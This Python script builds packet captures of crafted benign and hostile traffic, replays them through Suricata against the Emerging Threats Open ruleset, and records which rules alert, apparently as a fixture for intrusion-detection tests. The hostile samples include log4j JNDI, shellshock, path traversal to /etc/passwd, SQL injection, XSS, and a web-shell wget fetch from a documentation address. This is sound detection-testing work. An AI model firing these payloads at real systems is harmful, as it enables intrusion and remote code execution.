#!/usr/bin/env python3
"""Run the Emerging Threats Open ruleset over crafted traffic through a real Suricata.

The traffic is hostile and benign conversations for each protocol the
ruleset reads: scans and exploits coming in from outside, lookups and
tools going out, and plain browsing, name lookups and handshakes that
should raise nothing. Clients and servers inside `$HOME_NET` are
10.9.0.N and 10.10.0.N, outside it 198.51.100.N, N numbering the
conversation.

Writes et-verdicts.txt beside this script, in the format of the other
verdict fixtures: the rules that alerted, with the rules setting the
flowbits they read, under their own sids; then each packet and the sids
that alerted on it. Rules with sids from 2000000 to 2799999 are Emerging
Threats' under the BSD licence the header of the file repeats; no other
rule is written, and writing the committed fixture stops if another one
alerted. With --out elsewhere, as the job running the whole ruleset does,
those rules are left out and the test loads them from the ruleset.

    make-et-verdicts.py [--rules DIR] [--out FILE]

Without --rules, downloads ET Open for Suricata 8.0. The test needs neither
this script nor docker. Needs docker.
"""

import argparse
import glob
import hashlib
import io
import json
import os
import re
import struct
import subprocess
import sys
import tarfile
import tempfile
import urllib.request
from importlib import util

HERE = os.path.dirname(os.path.abspath(__file__))
IMAGE = os.environ.get("SURICATA_IMAGE", "jasonish/suricata:8.0.8")
URL = "https://rules.emergingthreats.net/open/suricata-8.0/emerging.rules.tar.gz"
EPOCH = 1_700_000_000
BSD = range(2_000_000, 2_800_000)
DEFAULT_OUT = os.path.join(HERE, "et-verdicts.txt")

spec = util.spec_from_file_location("header", os.path.join(HERE, "make-header-verdicts.py"))
header = util.module_from_spec(spec)
spec.loader.exec_module(header)

FIN, SYN, RST, PSH, ACK = 1, 2, 4, 8, 0x10
DATA = PSH | ACK



def home(n):
    return bytes([10, 9, 0, n])


def home_server(n):
    return bytes([10, 10, 0, n])


def outside(n):
    return bytes([198, 51, 100, n])


def tcp_conversation(packets, n, client, server, port, script, window=65535):
    """`script` holds (seconds, side, flags, payload). Each packet
    acknowledges everything the other side has sent so far."""
    cport = 43000 + n
    isn = {">": 1000, "<": 5000}
    sent = {">": 0, "<": 0}
    syn = {">": 0, "<": 0}
    for at, side, flags, payload in script:
        other = "<" if side == ">" else ">"
        src, dst, a, b = (client, server, cport, port) if side == ">" else (server, client, port, cport)
        if flags & SYN:
            seq = isn[side]
            syn[side] = 1
        else:
            seq = isn[side] + syn[side] + sent[side]
            sent[side] += len(payload)
        if flags & FIN:
            sent[side] += 1
        ack = isn[other] + syn[other] + sent[other] if flags & ACK else 0
        body = header.tcp(a, b, flags, payload, seq=seq, ack=ack, window=window, src=src, dst=dst)
        packets.append((n, at, header.ipv4(6, body, src=src, dst=dst)))


def udp_conversation(packets, n, client, server, port, script):
    cport = 43000 + n
    for at, side, payload in script:
        src, dst, a, b = (client, server, cport, port) if side == ">" else (server, client, port, cport)
        packets.append((n, at, header.ipv4(17, header.udp(a, b, payload, src=src, dst=dst), src=src, dst=dst)))


def talk(exchanges):
    """A connection opened, the exchanges each acknowledged, then closed."""
    script = [(0.0, ">", SYN, b""), (0.01, "<", SYN | ACK, b""), (0.02, ">", ACK, b"")]
    at = 0.1
    for side, payload in exchanges:
        other = "<" if side == ">" else ">"
        script.append((at, side, DATA, payload))
        script.append((at + 0.01, other, ACK, b""))
        at += 0.1
    script += [(at, ">", FIN | ACK, b""), (at + 0.01, "<", FIN | ACK, b""), (at + 0.02, ">", ACK, b"")]
    return script


def http_get(path, host, agent, extra=b""):
    return (
        b"GET " + path + b" HTTP/1.1\r\nHost: " + host + b"\r\nUser-Agent: " + agent
        + b"\r\nAccept: */*\r\n" + extra + b"\r\n"
    )


def http_ok(body, kind=b"text/html"):
    return (
        b"HTTP/1.1 200 OK\r\nContent-Type: " + kind + b"\r\nContent-Length: "
        + str(len(body)).encode() + b"\r\n\r\n" + body
    )


BROWSER = b"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36"


def name(domain):
    return b"".join(bytes([len(p)]) + p for p in domain.split(b".")) + b"\x00"


def dns_query(ident, domain, qtype=1):
    return struct.pack(">HHHHHH", ident, 0x0100, 1, 0, 0, 0) + name(domain) + struct.pack(">HH", qtype, 1)


def dns_answer(ident, domain, address):
    head = struct.pack(">HHHHHH", ident, 0x8180, 1, 1, 0, 0) + name(domain) + b"\x00\x01\x00\x01"
    return head + b"\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\x3c\x00\x04" + address


def client_hello(sni):
    server_name = b"\x00" + len(sni).to_bytes(2, "big") + sni
    server_names = len(server_name).to_bytes(2, "big") + server_name
    extension = b"\x00\x00" + len(server_names).to_bytes(2, "big") + server_names
    body = b"\x03\x03" + bytes(range(32)) + b"\x00" + b"\x00\x04\x13\x01\x00\x2f" + b"\x01\x00"
    body += len(extension).to_bytes(2, "big") + extension
    handshake = b"\x01" + len(body).to_bytes(3, "big") + body
    return b"\x16\x03\x01" + len(handshake).to_bytes(2, "big") + handshake


def server_hello():
    body = b"\x03\x03" + bytes(range(32, 64)) + b"\x00" + b"\x00\x2f" + b"\x00" + b"\x00\x00"
    handshake = b"\x02" + len(body).to_bytes(3, "big") + body
    return b"\x16\x03\x03" + len(handshake).to_bytes(2, "big") + handshake


def conversations():
    """(packets, a line naming each conversation)."""
    out, named = [], []
    n = 0

    def http(client, server, port, request, response, what):
        nonlocal n
        n += 1
        tcp_conversation(out, n, client(n), server(n), port, talk([(">", request), ("<", response)]))
        named.append(f"{n} http {what}")

    def lookup(domain, what, address=b"\x5d\xb8\xd8\x22"):
        nonlocal n
        n += 1
        ident = 0x1000 + n
        udp_conversation(out, n, home(n), outside(n), 53, [
            (0.0, ">", dns_query(ident, domain)), (0.01, "<", dns_answer(ident, domain, address)),
        ])
        named.append(f"{n} dns {what}")

    def tls(client, server, sni, what):
        nonlocal n
        n += 1
        tcp_conversation(out, n, client(n), server(n), 443, talk([(">", client_hello(sni)), ("<", server_hello())]))
        named.append(f"{n} tls {what}")

    def tcp(client, server, port, exchanges, what):
        nonlocal n
        n += 1
        tcp_conversation(out, n, client(n), server(n), port, talk(exchanges))
        named.append(f"{n} tcp {what}")

    # Plain traffic, which should raise nothing.
    http(home, outside, 80, http_get(b"/", b"example.com", BROWSER), http_ok(b"<html>hi</html>"), "benign browsing")
    lookup(b"example.com", "benign lookup")
    tls(home, outside, b"example.com", "benign handshake")
    tcp(home, outside, 22, [("<", b"SSH-2.0-OpenSSH_9.6\r\n"), (">", b"SSH-2.0-OpenSSH_9.6\r\n")], "benign ssh")

    # Scans and exploits coming in.
    inbound = [
        (b"/", b"sqlmap/1.7.2#stable (https://sqlmap.org)", "sqlmap"),
        (b"/", b"Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000001)", "nikto"),
        (b"/", b"Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)", "nmap nse"),
        (b"/", b"masscan/1.3 (https://github.com/robertdavidgraham/masscan)", "masscan"),
        (b"/", b"Mozilla/5.0 zgrab/0.x", "zgrab"),
        (b"/cgi-bin/../../../../etc/passwd", BROWSER, "etc passwd"),
        (b"/index.php?id=1%20UNION%20SELECT%201,2,3--", BROWSER, "union select"),
        (b"/search?q=<script>alert(document.cookie)</script>", BROWSER, "script in uri"),
        (b"/", b"${jndi:ldap://198.51.100.7:1389/a}", "log4j user agent"),
        (b"/cgi-bin/test.cgi", b"() { :; }; /bin/bash -c 'id'", "shellshock"),
        (b"/wp-login.php", BROWSER, "wordpress login"),
        (b"/.env", BROWSER, "dotenv"),
        (b"/phpmyadmin/index.php", BROWSER, "phpmyadmin"),
        (b"/cmd.exe?/c+dir", BROWSER, "cmd exe"),
        (b"/shell.php?cmd=wget%20http://198.51.100.9/x.sh", BROWSER, "wget in uri"),
    ]
    for path, agent, what in inbound:
        http(outside, home_server, 80, http_get(path, b"10.10.0.1", agent), http_ok(b"<html>no</html>"), what)
    http(outside, home_server, 80, http_get(b"/cgi-bin/id", b"10.10.0.1", BROWSER),
         http_ok(b"uid=0(root) gid=0(root) groups=0(root)\n", b"text/plain"), "id answers root")

    # Tools and lookups going out.
    outbound = [
        (b"/", b"api.ipify.org", b"python-requests/2.31.0", "ipify"),
        (b"/ip", b"ifconfig.me", b"curl/8.5.0", "ifconfig me"),
        (b"/", b"icanhazip.com", b"Wget/1.21.4", "icanhazip"),
        (b"/raw/abcdEFGH", b"pastebin.com", b"Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.3031", "pastebin powershell"),
        (b"/x.exe", b"198.51.100.40", b"Microsoft BITS/7.8", "bits exe from address"),
        (b"/", b"checkip.dyndns.org", BROWSER, "dyndns checkip"),
        (b"/json", b"ipinfo.io", b"Go-http-client/1.1", "ipinfo go"),
    ]
    for path, host, agent, what in outbound:
        http(home, outside, 80, http_get(path, host, agent), http_ok(b"203.0.113.5"), what)
    http(home, outside, 80, http_get(b"/payload.exe", b"198.51.100.41", BROWSER),
         http_ok(b"MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00" + b"\x00" * 44 + b"\x80\x00\x00\x00"
                 + b"This program cannot be run in DOS mode.", b"application/octet-stream"), "exe download")

    for domain, what in [
        (b"api.ipify.org", "ipify"), (b"ifconfig.me", "ifconfig me"), (b"abcd.ngrok.io", "ngrok"),
        (b"pastebin.com", "pastebin"), (b"myhost.duckdns.org", "duckdns"), (b"transfer.sh", "transfer sh"),
        (b"abcdefghijklmnop.onion", "onion"), (b"x.trycloudflare.com", "trycloudflare"),
        (b"discord.com", "discord"), (b"anydesk.com", "anydesk"),
    ]:
        lookup(domain, what)

    for sni, what in [
        (b"api.ipify.org", "ipify"), (b"abcd.ngrok.io", "ngrok"), (b"pastebin.com", "pastebin"),
        (b"x.trycloudflare.com", "trycloudflare"), (b"transfer.sh", "transfer sh"), (b"cdn.discordapp.com", "discord cdn"),
    ]:
        tls(home, outside, sni, what)

    tcp(outside, home_server, 22, [("<", b"SSH-2.0-OpenSSH_9.6\r\n"), (">", b"SSH-2.0-libssh_0.9.6\r\n")], "libssh in")
    tcp(outside, home_server, 21, [("<", b"220 FTP ready\r\n"), (">", b"USER root\r\n"), ("<", b"331 password\r\n"),
                                   (">", b"PASS root\r\n"), ("<", b"530 no\r\n")], "ftp root")
    tcp(outside, home_server, 23, [("<", b"login: "), (">", b"root\r\n")], "telnet root")
    tcp(outside, home_server, 25, [("<", b"220 mail ESMTP\r\n"), (">", b"EHLO x\r\n"), ("<", b"250 ok\r\n"),
                                   (">", b"VRFY root\r\n"), ("<", b"252 ok\r\n")], "smtp vrfy")

    # Scans below the application layer.
    n += 1
    for k, port in enumerate([22, 23, 80, 443, 445, 3389]):
        body = header.tcp(40000, port, SYN, b"", seq=k, window=1024, src=outside(n), dst=home_server(n))
        out.append((n, 0.01 * k, header.ipv4(6, body, src=outside(n), dst=home_server(n))))
    named.append(f"{n} tcp nmap syn window 1024")
    n += 1
    linux = struct.pack("<II", 1700000000, 0) + bytes(range(0x10, 0x38))
    windows = b"abcdefghijklmnopqrstuvwabcdefghi"
    for k, payload in enumerate([linux, windows]):
        body = header.icmp(8, 0, struct.pack(">HH", 0x4242, k), payload)
        out.append((n, 0.01 * k, header.ipv4(1, body, src=outside(n), dst=home_server(n))))
    named.append(f"{n} icmp linux and windows pings")
    n += 1
    for k, port in enumerate([161, 1900, 5060]):
        payload = {
            161: bytes.fromhex("302902010104067075626c6963a01c0204000000010201000201003010300e060a2b06010201010100000500"),
            1900: b"M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\nMAN: \"ssdp:discover\"\r\nMX: 1\r\nST: ssdp:all\r\n\r\n",
            5060: b"OPTIONS sip:100@10.10.0.1 SIP/2.0\r\nVia: SIP/2.0/UDP 198.51.100.1\r\nFrom: \"sipvicious\"<sip:100@1.1.1.1>\r\nUser-Agent: friendly-scanner\r\n\r\n",
        }[port]
        body = header.udp(40000 + k, port, payload, src=outside(n), dst=home_server(n))
        out.append((n, 0.01 * k, header.ipv4(17, body, src=outside(n), dst=home_server(n))))
    named.append(f"{n} udp snmp public, ssdp, sipvicious")

    # Repeated often enough to pass the thresholds the rules above stay under.
    n += 1
    for k in range(6):
        body = header.tcp(41000 + k, 22, SYN, b"", seq=k, src=outside(n), dst=home_server(n))
        out.append((n, 0.5 * k, header.ipv4(6, body, src=outside(n), dst=home_server(n))))
    named.append(f"{n} tcp six ssh connection attempts")
    n += 1
    nikto = http_get(b"/", b"10.10.0.1", b"Mozilla/5.00 (Nikto/2.1.6) (Evasions:None) (Test:000001)")
    tcp_conversation(out, n, outside(n), home_server(n), 80,
                     talk([x for _ in range(6) for x in ((">", nikto), ("<", http_ok(b"<html>no</html>")))]))
    named.append(f"{n} http six nikto requests")
    return out, named


def corpus(rules_dir):
    """Every enabled rule of the ruleset, by sid, and a fingerprint of it."""
    rules, digest = {}, hashlib.sha256()
    for path in sorted(glob.glob(os.path.join(rules_dir, "*.rules"))):
        for line in open(path, encoding="utf-8", errors="replace"):
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            digest.update(line.encode() + b"\n")
            sid = re.search(r"[;(\s]sid\s*:\s*(\d+)\s*;", line)
            if sid:
                rules[int(sid.group(1))] = line
    return rules, digest.hexdigest()


def flowbit_names(rule, verbs):
    names = set()
    for m in re.finditer(r"(?:flowbits|xbits)\s*:\s*([a-z_]+)\s*,\s*([^;]+);", rule):
        if m.group(1) in verbs:
            names.update(p.strip() for p in re.split(r"[|&]", m.group(2).split(",")[0]))
    return names


def with_setters(chosen, rules):
    """The chosen rules, and every rule writing a flowbit one of them reads,
    until no rule reads a bit no rule writes."""
    chosen = set(chosen)
    while True:
        wanted = set()
        for sid in chosen:
            wanted |= flowbit_names(rules[sid], {"isset", "isnotset"})
        more = {sid for sid, rule in rules.items()
                if sid not in chosen and flowbit_names(rule, {"set", "unset", "toggle", "setother"}) & wanted}
        if not more:
            return chosen
        chosen |= more


def write_pcap(path, packets):
    times = []
    with open(path, "wb") as f:
        f.write(struct.pack("<IHHiIII", 0xA1B2C3D4, 2, 4, 0, 0, 65535, 1))
        for n, at, ip in packets:
            ns = (n * 10_000 * 1000 + round(at * 1000)) * 1_000_000
            times.append(ns)
            secs, rest = divmod(ns, 1_000_000_000)
            data = header.frame(ip)
            f.write(struct.pack("<IIII", EPOCH + secs, rest // 1000, len(data), len(data)))
            f.write(data)
    return times


def run_suricata(work, rules_text, packets):
    with open(os.path.join(work, "case.rules"), "w", encoding="utf-8") as f:
        f.write(rules_text)
    times = write_pcap(os.path.join(work, "case.pcap"), packets)
    out = os.path.join(work, "out")
    os.mkdir(out)
    os.chmod(out, 0o777)
    run = subprocess.run(
        ["docker", "run", "--rm", "-v", f"{work}:/w", "--entrypoint", "suricata", IMAGE,
         "-r", "/w/case.pcap", "-S", "/w/case.rules", "-l", "/w/out", "-k", "none",
         "--runmode", "single", "--set", "packet-alert-max=255",
         "--set", "stream.reassembly.randomize-chunk-size=no"],
        capture_output=True, text=True, check=False,
    )
    log = run.stdout + run.stderr
    if os.environ.get("SHOW_LOG"):
        print(log)
    eve = os.path.join(out, "eve.json")
    if not os.path.exists(eve):
        sys.exit(f"suricata wrote no eve.json:\n{log}")
    alerted, ended = {}, {}
    for line in open(eve, encoding="utf-8"):
        event = json.loads(line)
        if event.get("event_type") != "alert":
            continue
        sid = event["alert"]["signature_id"]
        if "pcap_cnt" in event:
            alerted.setdefault(event["pcap_cnt"] - 1, []).append(sid)
        else:
            ended.setdefault(int(event["src_ip"].split(".")[3]), []).append(sid)
    return times, alerted, ended


def download(work):
    data = urllib.request.urlopen(URL, timeout=120).read()
    with tarfile.open(fileobj=io.BytesIO(data)) as tar:
        tar.extractall(work, filter="data")
    return os.path.join(work, "rules")


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--rules", help="the ruleset's rules directory; downloaded when absent")
    parser.add_argument("--out", default=DEFAULT_OUT)
    args = parser.parse_args()
    packets, named = conversations()
    with tempfile.TemporaryDirectory() as work:
        os.chmod(work, 0o777)
        rules_dir = args.rules or download(work)
        rules, fingerprint = corpus(rules_dir)
        with open(os.path.join(rules_dir, "BSD-License.txt"), encoding="utf-8") as f:
            licence = [line if line.startswith("#") else "# " + line for line in f.read().splitlines()]
        times, alerted, ended = run_suricata(work, "\n".join(rules.values()) + "\n", packets)
        fired = {sid for sids in list(alerted.values()) + list(ended.values()) for sid in sids}
        foreign = sorted(sid for sid in fired if sid not in BSD)
        if foreign and args.out == DEFAULT_OUT:
            sys.exit(f"rules outside the BSD sid range alerted: {foreign}")
        kept = with_setters(fired, rules)
        kept = {sid for sid in kept if sid in BSD}
        version = subprocess.run(
            ["docker", "run", "--rm", "--entrypoint", "suricata", IMAGE, "-V"],
            capture_output=True, text=True, check=True,
        ).stdout.strip()
    flows = sorted({n for n, _, _ in packets})
    lines = [f"# {version}, run by make-et-verdicts.py; do not edit by hand."]
    lines.append(f"# ET Open for Suricata 8.0, {len(rules)} enabled rules, sha256 {fingerprint} over them.")
    lines.append("# The rules below are Emerging Threats Open rules, sids 2000000 to 2799999,")
    lines.append("# under the licence the ruleset ships as BSD-License.txt:")
    lines += [line.rstrip() for line in licence]
    lines.append("# 'conversation N WHAT' names each conversation, then 'rule SID RULE' the")
    lines.append("# rules that alerted and the rules writing the flowbits they read, then")
    lines.append("# 'packet NS HEX SIDS' and 'end N SIDS' as in the other verdict fixtures.")
    lines += [f"conversation {line}" for line in named]
    lines += [f"rule {sid} {rules[sid]}" for sid in sorted(kept)]
    for n, ((_, _, ip), ns) in enumerate(zip(packets, times)):
        sids = ",".join(str(s) for s in sorted(alerted.get(n, ()))) or "-"
        lines.append(f"packet {ns} {ip.hex()} {sids}")
    for n in flows:
        sids = ",".join(str(s) for s in sorted(ended.get(n, ()))) or "-"
        lines.append(f"end {n} {sids}")
    with open(args.out, "w", encoding="utf-8") as f:
        f.write("\n".join(lines) + "\n")
    print(f"{len(fired)} rules alerted, {len(kept)} kept, over {len(packets)} packets")


if __name__ == "__main__":
    main()
